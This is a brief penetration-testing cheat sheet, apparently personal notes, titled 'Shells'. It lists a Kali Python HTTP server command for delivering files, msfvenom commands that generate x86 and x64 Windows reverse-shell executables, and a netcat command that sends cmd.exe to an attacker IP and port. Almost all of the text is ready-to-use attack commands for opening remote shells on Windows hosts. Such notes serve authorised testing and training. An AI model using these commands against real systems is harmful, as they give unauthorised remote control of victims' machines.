# Shells

## Start HTTP python server on Kali

python3 -m http.server 8080

## Windows reverse shell

Stageless Payloads for Windows

<table data-header-hidden><thead><tr><th width="150"></th><th></th></tr></thead><tbody><tr><td>x86</td><td><code>msfvenom -p windows/shell_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f exe > shell-x86.exe</code></td></tr><tr><td>x64</td><td><code>msfvenom -p windows/shell_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f exe > shell-x64.exe</code></td></tr></tbody></table>

## Start reverse shell from Windows

`c:\temp\nc.exe -e cmd.exe <Attack_IP> <port>`
